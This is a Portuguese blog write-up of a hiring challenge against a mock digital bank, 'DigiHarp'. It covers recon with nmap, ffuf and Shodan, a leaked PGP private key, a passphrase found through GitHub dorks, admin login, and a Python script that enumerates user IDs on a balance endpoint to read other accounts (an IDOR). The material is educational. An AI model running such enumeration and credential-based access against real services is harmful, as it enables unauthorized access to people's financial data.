
![Desafio](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4g819gdmbwzr50pon4b0.png)


A ideia desse texto é mostrar como foi o processo de resolução do Desafio proposto pela **Tempest Security Intelligence** no teste específico para a vaga de Estágio em Consultoria Técnica edição 2025.2. O único objetivo é educativo.


## Harpia-tech.site

Basicamente fui contrada para realizar uma análise de segurança do novo banco digital do mercado chamado DigiHarp. A aplicação necessita de uma investigação minuciosa para encontrar possíveis vulnerabilidades e evitar ataques mal-intencionados. O endereço é https://harpia-tech.site.

Por se tratar de um banco digital,  o mesmo traz algumas informações que possam chamar a atenção de um consumidor e além disso, possuem um video de apresentação do banco, trazendo inclusive a inspiração na Harpia.

![DgiHarp](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4ny1qnipvg53xxi60f9l.png)

### Security

DigiHarp deixa claro sobre as medidas de segurança utilizadas para a proteção de dados financeiros e transações, desde a autenticação biométrica até a detectação de fraudes em tempo real e a utilização de  **PGP** (Pretty Good Privacy) para criptografar as informações. Este ponto do pgp é importante, porque vai ser o centro da resolução do desafio.

![Security](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bwhz6io4oepc58cvvchp.png)

## DigiHarp - Presentation

Clicando no video de apresentação somos redirecionados para o video na plataforma do youtube e que está como não listado, apresentando um pouco do banco e a resposta referente a primeira questão sobre o nome do social manager está bem no início da descrição e de plus também uma chave privada pgp exposta no final dessa descrição!
![DigiHarp Presentation](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hih8r72j4ir5lyquh5ud.png)
![Description](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mdqtfxtgnp9meullddjk.png)

### Chave privada pgp

```html
🔑 Public Key for Secure Communications:
----BEGIN PGP PRIVATE KEY BLOCK----
[Conteúdo]
----END PGP PRIVATE KEY BLOCK----
```

A chave privada precisa estar bem estruturada, para que seja importada e neste caso, foi salvo  como private.key.

### Wappalyzer, Enumeração de subdomínios, nmap e Shodan

Com o wappalyzer foi possível verificar as tecnologias utilizadas como node.js, express, nginx, etc, que poderiam ser úteis em uma possibilidade de análise de CVE ou um fuzzing mais inteligente, tentando fazer brute-forces com wordlists específicas. E de quebra ocorreu uma tentativa de enumeração de subdomínios, mas sem sucesso relevante. 

Com a extensão do shodan tínhamos acesso ao IP do alvo e hostnames que confirmam o uso de cloud aws, além da porta aberta 443, mas nada que fosse de fato relevante para a resolução do desafio. Apenas coleta de informações.

![Shodan](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n0smy8c2k2q37mypxc3g.png)

```bash

nmap -sV -p- -vv IP-HARPIA-TECH.SITE    
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE  REASON  VERSION
443/tcp open  ssl/http syn-ack nginx

```

## endpoints e login

Foi feita a análise de cada endpoint do site para encontrar alguma informação relevante, dentre elas o login, por trazer a possibilidade de talvez existir uma conta de usuário vagando por aí ou até mesmo tentar realizar a enumeração de usernames e possivelmente fazer um brute-force na senha, mas é claro que não seria tão simples assim, pois dentre as tecnologias que o wappalyzer capturou havia uma de captcha chamada hcaptcha que dificultaria esse brute-force e ao tentar realizar login com o famoso admin-admin, o mesmo apenas informa credenciais inválidas, sem dar qualquer vestígio de enumeração de um usuário válido e mesmo tentando capturar via burp suite para forçar as tentativas de logar, o fato de ter hcaptcha inibe isso e força o uso de um novo token de captcha na requisição.
![Login](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vhfli82x6qbi5a4kxiio.png)

![Burp-Login](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7wzoylg6w5m1fjd8mlv7.png)

Foi mapeado todos os endpoints até então possíveis diante do que foi verificado pelo dev tools e burp suite. Apesar de existir um endpoint /dashboard que é redirecionado pós login, seria difícil de bypassar o mesmo devido as dificuldades no endpoint de /login.

```bash
https://harpia-tech.site/cards.html
https://harpia-tech.site/savings.html
https://harpia-tech.site/loans.html
https://cdn.jsdelivr.net/npm/chart.js
https://harpia-tech.site/api/logout
https://harpia-tech.site/checking.html
https://harpia-tech.site/dashboard.html
https://harpia-tech.site/analytics.html
https://harpia-tech.site/
https://harpia-tech.site/support.html
https://harpia-tech.site/images/cardgeneric.png
https://harpia-tech.site/products.html
https://harpia-tech.site/login
https://harpia-tech.site/harpia-logo-removedbg.png
https://harpia-tech.site/api/balance
https://harpia-tech.site/investments.html
https://harpia-tech.site/api/transactions
https://harpia-tech.site/api/login
https://harpia-tech.site/login.html
https://harpia-tech.site/dashboard
```

Além dos endpoints usuais, também havia algumas voltadas a api além do login, dando sinal de que poderia haver algum diretório solto ou que pudesse trazer algo interessante. Entretanto, para isso foi necessário realizar um fuzzing usando ffuf com diretórios comuns e além disso também específicos voltados para apis, etc., mas só foi encontrado uma rota escondida chamada **/backup.**

```bash
ffuf -u https://harpia-tech.site/FUZZ -w wordlist.txt -mc 200,304 -fs 404

/backup    [Status: 200, Size: xxx, Words: xxx, Lines: 118, Duration: 213ms]
```

Nele tinha um arquivo zipado intitulado routes e dentro dele 5 arquivos pgp que possuíam mensagens e informações criptografadas, mas que apenas um dos arquivos seria descriptografado pela passphrase correta da chave privada, pois as outras estariam usando subchaves diferentes.
![Routes](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/n0l1l052r1ukyp2o3zou.jpeg)

![files pgps](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qzivgme6h59an6eqtng7.png)

### Easter Egg

Ao tentar ir pelo caminho fácil de tentar encontrar o robots.txt, a pessoa é redirecionada para a musica do Rick Astley - Never Gonna Give Up hahaha, acabando com os nossos sonhos.

[Rick Astley - Never Gonna Give Up](https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley)
![Rick Astley - Never Gonna Give Up](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/inm525kuxr37g18p6jma.jpeg)

### Importação de chave privada

O cenário parecia perfeito, até que fosse necessário importar a chave privada pgp, e se deparar com a solicitação da frase secreta, tanto que foi o maior problema para resolução, pois não conseguia encontrar nada relacionado a uma possível passphrase. Apenas a frase secreta nos separava da glória, para  conseguir descriptografar a mensagem pgp e assim ter acesso as informações necessárias para finalizar o desafio.
![Passphrase - PGP](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1m9s2dzzkotq1tl2tsu1.png)

Após diversas tentativas, havia algo que não tinha de fato tentado decentemente, que foi OSINT PARA DENTRO (pegou mal né) a favor dos meros mortais, como Google Dorks e GitHub Dorks, mas antes disso também foi analisado possibilidades no Linkedin, Twitter ou algo que estivesse relacionado com a empresa ou o social manager Donald Okard. No fim, nada foi encontrado e tudo estava mais óbvio do que nunca,  o lugar que teria tal informação seria justamente o GitHub.

### GitHub Dorks

Usando o buscador do github foi possível encontrar um repositório do DigiHarp chamado  PGP-EncDec-System.
![GitHub](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0lx2fkgb3upxfnrm8nlq.png)
Foi então que tudo fez sentido e as coisas realmente funcionaram no processo de resolução do teste. Ao adentrar nele havia as informações para instruir novos funcionarios sobre como o sistema de pgp da empresa funcionava. 


![PGP-passphrase](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l1t3g306esiw1wfpzdg2.png)
## Descriptografando

Com o acesso ao passphrase só é necessário importar finalmente e descriptografar o arquivo que realmente tinha as informações da rota e é justamente o **marketing.pgp.**

```bash
gpg --import private.key

gpg --decrypt marketing.pgp 
gpg: cifrado com chave rsa2048, ID F3C9104ACEE74A87, criado em 2025-07-08
      "DigiHarp Backup <backup@digiharp.com>"
{
  "openapi": "3.0.0",
  "info": {
    "title": "DigiHarp Bank API",
    "version": "1.0.0",
    "description": "Backup of some random API endpoints."
  },
  "paths": {
    "/active-user": {
      "get": {
        "summary": "Get active admin user",
        "responses": {
          "200": {
            "description": "Admin credentials",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "username": {
                      "type": "string"
                    },
                    "password": {
                      "type": "string"
                    }
                  }
                },
                "example": {
                  "username": "admin",
                  "password": "***************"
                }
              }
            }
          }
        }
      }
    },
    "/accounts": {
      "get": {
        "summary": "List all user accounts",
        "responses": {
          "200": {
            "description": "Accounts list"
          }
        }
      }
    },
    "/accounts/{accountId}": {
      "get": {
        "summary": "Get account details",
        "responses": {
          "200": {
            "description": "Account details"
          }
        }
      }
    },
    "/accounts/{accountId}/balance": {
      "get": {
        "summary": "Get account balance",
        "responses": {
          "200": {
            "description": "Account balance"
          }
        }
      }
    },
    "/accounts/{accountId}/transactions": {
      "get": {
        "summary": "List account transactions",
        "responses": {
          "200": {
            "description": "Transaction list"
          }
        }
      }
    },
    "/transactions": {
      "post": {
        "summary": "Create a new transaction",
        "responses": {
          "201": {
            "description": "Transaction created"
          }
        }
      }
    },
    "/transactions/{transactionId}": {
      "get": {
        "summary": "Get transaction details",
        "responses": {
          "200": {
            "description": "Transaction details"
          }
        }
      }
    },
    "/cards": {
      "get": {
        "summary": "List all cards",
        "responses": {
          "200": {
            "description": "Cards list"
          }
        }
      }
    },
    "/cards/{cardId}/block": {
      "post": {
        "summary": "Block a card",
        "responses": {
          "200": {
            "description": "Card blocked"
          }
        }
      }
    },
    "/loans": {
      "get": {
        "summary": "List available loan offers",
        "responses": {
          "200": {
            "description": "Loan offers"
          }
        }
      }
    },
    "/loans/apply": {
      "post": {
        "summary": "Apply for a loan",
        "responses": {
          "201": {
            "description": "Loan application submitted"
          }
        }
      }
    },
    "/investments": {
      "get": {
        "summary": "List investment products",
        "responses": {
          "200": {
            "description": "Investment products"
          }
        }
      }
    },
    "/investments/{investmentId}/status": {
      "get": {
        "summary": "Get investment status",
        "responses": {
          "200": {
            "description": "Investment status"
          }
        }
      }
    },
    "/support/tickets": {
      "post": {
        "summary": "Open a support ticket",
        "responses": {
          "201": {
            "description": "Ticket created"
          }
        }
      }
    },
    "/notifications": {
      "get": {
        "summary": "Get user notifications",
        "responses": {
          "200": {
            "description": "Notifications list"
          }
        }
      }
    },
    "/profile": {
      "get": {
        "summary": "Get user profile",
        "responses": {
          "200": {
            "description": "User profile"
          }
        }
      },
      "put": {
        "summary": "Update user profile",
        "responses": {
          "200": {
            "description": "Profile updated"
          }
        }
      }
    }
  }
}                                        
```

## Dashboard

Aqui só foi partir para o abraço, pois tinha informações dos endpoints da api, apesar de nem todos estarem de fato acessível, mas tinhamos já a conta do admin (ele sempre está entre nós, é inevitável) e a senha, que estavam como exemplo, na rota de **/active-user**. Agora só restava encontrar as duas últimas respostas sobre o endereço da conta do administrador e o saldo da conta do usuário perik_lin!

Ao logar, a resposta da terceira pergunta está no final da página.
![User-admin](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6aj88dy8vkpm5znez0ab.jpeg)
![Address](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zjkjsx9rss6sg5i74aua.png)

Por fim, resta apenas a última questão sobre o saldo do usuário perik_lin, mas para isso é necessário entender a lógica de como funciona o range do id dos usuários e assim ter a possibilidade de enumeração até nosso perik. Um ponto é que poderia tentar acessar o endpoint /accounts da api, que teoricamente listaria todos os usuários e suas respectivas informações,  no entanto, a mesma não está acessível aos meros mortais e dando assim o temido erro 404.

```bash
 "/accounts/{accountId}/transactions": {
      "get": {
        "summary": "List account transactions",
        "responses": {
          "200": {
            "description": "Transaction list"
          }
        }
      }
    },
```


![/api/accounts](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7ra02hxfaj2frm9cnj5w.png)

Mas no endpoint /transactions é possível ter uma dimensão dos ids e o range desses user_id através das transações que foram feitas.

![/api/transactions](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9sc8c60a1w0wwqhnotr2.png)

A resposta para a última pergunta está no endpoint /api/balance, no qual a partir do parâmetro user_id, podemos testar qualquer número inteiro e ter acesso ao nome e saldo da pessoa.
Para facilitar o trabalho, a IA tornou o processo mais prático, tendo em vista o tamanho do range e ajudou a desenvolver um script em python para automatizar o processo e ter acesso ao saldo da última pergunta.

![/api](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ge6vfnsllrjl2ef1c3qd.png)

### Script

```bash
import requests
import json

COOKIE = "biscoitos_da_sessão"
URL = "https://harpia-tech.site/api/balance"

headers = {
    "Cookie": f"connect.sid={COOKIE}",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "TudoNossoNadaDeles/5.0",
}

def main():
    for uid in range(1, 1001):  
        try:
            resp = requests.post(URL, headers=headers, json={"user_id": str(uid)}, timeout=10)
            
            if resp.status_code == 200:
                data = resp.json()
                if "error" in data:
                    print(f"[{uid}]  {data['error']}")
                else:
                    msg = data.get("message", "")
                    bal = data.get("balance", "?")
                    print(f"[{uid}]  {msg} | Saldo: {bal}")
                    
                    if "perik_lin" in msg.lower(): 
                        print("\n Encontrado o usuário Perik Lin!")
                        print(f"UserID: {uid} | Saldo: {bal}")
                        break
            else:
                print(f"[{uid}]  HTTP {resp.status_code}")
        
        except Exception as e:
            print(f"[{uid}] Erro: {e}")

if __name__ == "__main__":
    main()

```

e a mágica aconteceu:

![perik_lin](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1es3vqu0hv0qjhw20w5x.png)

## Conclusão

O desafio foi bem interessante, acredito que se pode construir e dar uma margem de aprendizado bem bacana em volta de recon. Vale bastante a revisão através de laboratórios do HackTheBox e TryHackMe, que ajudam bastante no aprendizado e seguir sempre nessa jornada de conhecimento. Se não conseguiu, está tudo bem, a primeira vez que realizei o desafio da Tempest, não tinha resolvido também e fiquei bastante abalada com meu pouco conhecimento, mas decidi que iria melhorar e resolver o teste específico e assim foi, aqui estou eu  fazendo um write up sobre  isso ;) , mas não significa que deixei de ter pouco conhecimento, ainda tenho muito o que aprender hihi. Não estou aqui para te dizer o que é certo ou errado nessa caminhada, porque também sou uma iniciante, mas jamais desista, é muito importante ter resiliência e disciplina. 

Sabe também o que é importante? Estar em comunidade, VENHA PRA [AXÉ SEC](https://axesec.cc) IMEDIATAMENTE!!
**FLAG{4X3_S3C_CTF}**

Até a próxima pessoal.